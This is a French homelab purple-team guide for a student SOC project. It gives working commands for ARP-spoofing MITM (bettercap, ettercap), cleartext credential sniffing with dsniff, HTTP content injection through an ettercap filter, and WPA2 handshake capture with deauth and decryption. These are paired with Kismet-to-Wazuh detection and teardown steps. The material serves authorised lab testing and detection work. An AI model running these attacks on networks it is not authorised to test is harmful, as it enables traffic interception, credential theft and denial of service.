# PurpleOps - Lab Arsenal (on-path + WiFi) - PFE SOAR

> **Périmètre : TON homelab uniquement.** Tout ci-dessous se fait sur tes machines, ton AP (AFFOUNDRY), ton réseau. Rien d'autre.

## 0. La réalité qui décide de tout : le NOYAU

Le mode moniteur 802.11 et l'injection radio dépendent du **noyau Android**, pas de l'adaptateur.
Le **Pixel 7a tourne sur noyau stock (GKI)** : pas de `mac80211`, pas de driver USB WiFi (ath9k_htc, rtl8187...).
Conséquence :

| Technique | Interface | Marche sur le tel (noyau stock) ? |
|---|---|---|
| **On-path / ARP-spoof / injection TCP** | `wlan0` en mode **géré** (raw socket) | **Oui**, probablement — testé par la sonde `install-lab-arsenal.sh` |
| **Sniff 802.11 over-the-air / WPA2 decrypt** | adaptateur en **mode moniteur** | **Non** sur noyau stock, *même avec* un adaptateur USB |

→ Pour le monitor : soit **flasher un noyau NetHunter** sur le Pixel (lourd, risqué), soit — recommandé — un **capteur dédié Pi/laptop** (qui devient aussi ton WIDS permanent).

## Deux points de vue d'attaque (ne pas les confondre)

- **Côté WAN (box Orange, 192.168.11.0/24)** : on-path `pfSense-WAN(.253) <-> box(.11.1)`. Tu chevauches les flux NAT sortants.
- **Côté LAN SOC (AP AFFOUNDRY, 10.10.10.0/24)** : on-path `node GPU(.242) <-> pfSense-LAN(.253)`. **C'est le bon vantage pour intercepter le node GPU.** Associe le tel/capteur à AFFOUNDRY.

Rappels d'adressage : box `192.168.11.1` | pfSense WAN `192.168.11.253` / LAN `10.10.10.253` | node GPU `10.10.10.242` | AP AFFOUNDRY `10.10.10.254` | lab vmbr2 `192.168.101.0/24`.

---

## 1. Hardware - quoi acheter (et quoi éviter sur ta capture)

Ce qui compte = **le chipset**, pas le logo "Alfa".

| Chipset | Bandes | Monitor+injection | Verdict |
|---|---|---|---|
| **AR9271** (Atheros, ath9k_htc) | 2.4 GHz | Excellent, driver in-kernel | **Meilleur choix** 2.4 GHz, marche direct sur Pi/laptop |
| **MT7612U** (AWUS036ACM) | 2.4+5 GHz | Excellent (mt76) | **Meilleur choix** si tu veux capturer le 5 GHz |
| RTL8812AU (AWUS036ACH) | 2.4+5 GHz | Bon (driver dkms) | OK dual-band, driver à installer |
| RTL8187 (AWUS036H) | 2.4 GHz b/g | OK mais 54 Mbps, rate des trames N | Dépannage seulement |
| RTL8188xx (nano "Alfanext") | 2.4 GHz | Instable / souvent cassé | **À éviter** |

**Sur ta capture d'écran :** les bonnes (AWUS036H / "Alfa pour Kali 10dBi" = AR9271-like) sont **en rupture**. Les **en stock** sont des **nano Alfanext Wireless-N (79 / 164 Dhs) = RTL8188 → à éviter** pour un PFE. Ne prends un adaptateur que si tu confirmes AR9271 ou MT7612U. Comme tu es **admin d'AFFOUNDRY**, crée un SSID de test **2.4 GHz WPA2-PSK** : un AR9271 suffit alors parfaitement.

> Le tel n'a pas la main sur sa carte interne (normal). Mais même un adaptateur USB-C ne fera **pas** de monitor sur le noyau stock : garde l'adaptateur pour le **Pi/laptop**.

---

## 2. Section A - On-path MITM depuis PurpleOps (téléphone, wlan0)

Associe le tel au réseau du vantage choisi (AFFOUNDRY pour viser le node GPU). Désactive Tailscale d'abord.

```bash
# 1) Routage pour relayer le trafic intercepté (sinon tu coupes la victime = DoS)
sysctl -w net.ipv4.ip_forward=1

# 2a) bettercap (moderne, tout-en-un) - cible = node GPU .242, passerelle auto
bettercap -iface wlan0 -eval "set arp.spoof.targets 10.10.10.242; set arp.spoof.internal true; arp.spoof on; net.sniff on"

# 2b) ou ettercap (victime <-> passerelle explicites)
ettercap -T -q -i wlan0 -M arp:remote /10.10.10.242// /10.10.10.253//

# 3) Lire les creds en clair qui passent
dsniff -i wlan0 -m

# 4) TEARDOWN (restaure les tables ARP, remet ip_forward)
pkill -f bettercap; pkill -f ettercap; pkill -f dsniff
sysctl -w net.ipv4.ip_forward=0
```

Ces 4 étapes sont déjà en **boutons** dans `presets.lab.json` (voir §6).

---

## 3. Section B - Injection "retour légitime" (le coeur de ta question)

Tu **ne crées pas** de nouvelle entrée : tu **injectes dans une session TCP établie** vue en MITM. pfSense est stateful → seul un paquet qui matche un état existant (bon 4-tuple + seq/ack dans la fenêtre) est accepté. On-path tu connais seq/ack (tu lis le flux) → injection possible. **TLS casse tout (MAC/cert) : ça ne marche qu'en clair (HTTP, DNS/53, NTP, apt HTTP).**

**Démo propre avec ettercap (remplacement de contenu dans un flux HTTP) :**

```bash
cat > /tmp/inject.filter <<'EOF'
if (ip.proto == TCP && tcp.src == 80) {
   if (search(DATA.data, "</body>")) {
      replace("</body>", "<!-- PFE_SOAR_INJECT --></body>");
      msg("[inject] payload insere\n");
   }
}
EOF
etterfilter /tmp/inject.filter -o /tmp/inject.ef
ettercap -T -q -i wlan0 -F /tmp/inject.ef -M arp:remote /10.10.10.242// /10.10.10.253//
```

**Scaffold pédagogique scapy** (pour *voir* seq/ack et le point d'injection - lab, à compléter) :

```python
from scapy.all import sniff, IP, TCP
def show(p):
    if p.haslayer(TCP) and p.haslayer(IP):
        t=p[TCP]; print(f"{p[IP].src}:{t.sport} -> {p[IP].dst}:{t.dport} seq={t.seq} ack={t.ack} flags={t.flags}")
        # Injection = forger IP()/TCP(seq=..., ack=..., flags='PA')/payload puis send().
        # A ne faire que sur TES flux en clair, pour comprendre pourquoi tout doit etre en TLS.
sniff(iface="wlan0", filter="tcp and host 10.10.10.242", prn=show, count=20)
```

> Lien direct avec ta **dette n°1** : le flux `syslog-ng -> Wazuh` en clair TCP/514 est exactement ce genre de cible injectable. Ce test justifie le passage en TLS.

---

## 4. Section C - WiFi monitor + déchiffrement WPA2 (Pi / laptop / noyau NetHunter)

Marche avec **ta** PSK (tu es admin AFFOUNDRY). Pas besoin d'être associé : le monitor est **passif**.

```bash
# 1) Interface en monitor (adaptateur AR9271/MT7612U)
airmon-ng start wlan1                 # -> wlan1mon
# 2) Repérer l'AP et le canal du node GPU
airodump-ng wlan1mon
# 3) Capturer le 4-way handshake du node GPU sur SON canal
airodump-ng -c <CANAL> --bssid <BSSID_AFFOUNDRY> -w cap wlan1mon
# 4) Forcer une réassociation pour choper le handshake (1-2 trames deauth)
aireplay-ng -0 2 -a <BSSID_AFFOUNDRY> -c <MAC_NODE_GPU> wlan1mon
# 5) Déchiffrer avec TA passphrase
airdecap-ng -e <SSID_TEST> -p <TA_PSK> cap-01.cap     # -> cap-01-dec.cap en clair
tshark -r cap-01-dec.cap                               # lire le trafic déchiffré
```

- **WPA2-PSK** : déchiffrable (pas de forward secrecy face à qui a la PSK). **WPA3-SAE** : non. **Enterprise** : non.
- Vérifie ton mode : `iw dev wlp41s0 link` sur le node, ou l'admin AFFOUNDRY.
- Capture 802.11ac/ax : un seul adaptateur rate des trames (MIMO, 80 MHz). OK pour du ciblé.

---

## 5. Section D - WIDS Kismet -> Wazuh (capteur permanent, Pi)

Transforme l'outil d'interception en **détection** (comble un angle mort actuel : aucun capteur radio).

```bash
kismet -c wlan1mon          # survey + détecte deauth flood / rogue AP
# Logs Kismet (JSON/alertes) -> localfile agent Wazuh -> règles custom (deauth = T1557/T1040)
```

Détecte aussi **ta propre attaque** de la Section C (les deauth de l'étape 4) : boucle purple team complète.

---

## 6. Charger les sections dans PurpleOps (sans rebuild)

L'app lit en priorité `/data/local/soc/presets.json`. Pousse l'override :

```bash
# depuis le chroot / adb, en root
mkdir -p /data/local/soc
cp presets.lab.json /data/local/soc/presets.json
```

Relance PurpleOps : il affiche `[presets] charges depuis /data/local/soc/presets.json` et les boutons LAB/MITM apparaissent. (Pour les rendre permanents dans l'APK : remplacer `app/src/main/assets/presets.json` sur la branche `main` GitHub → CI → auto-update.)

---

## 7. Section E - Vérification purple team (que voit le SOC ?)

Après chaque test, vérifie la détection (c'est ça, la valeur PFE) :

- **ARP-spoof / MITM** : Suricata (WAN) ne le voit pas (L2 interne). Zeek voit-il l'anomalie ARP ? → probablement **non** aujourd'hui = **finding** → justifie le WIDS.
- **Deauth / monitor** : aucun capteur radio actuel → **angle mort** → Kismet (§5) le comble.
- **Scan/exploit via un flux chevauché** : Zeek sur `vmbr2`/uplink peut matcher si en clair.
- Note le **MTTD** (temps de détection) ou l'absence de détection pour le rapport.

## 8. Teardown systématique

```bash
pkill -f bettercap; pkill -f ettercap; pkill -f dsniff; pkill -f airodump; pkill -f kismet
sysctl -w net.ipv4.ip_forward=0
airmon-ng stop wlan1mon 2>/dev/null
# réactiver Tailscale, revérifier les tables ARP des victimes
```
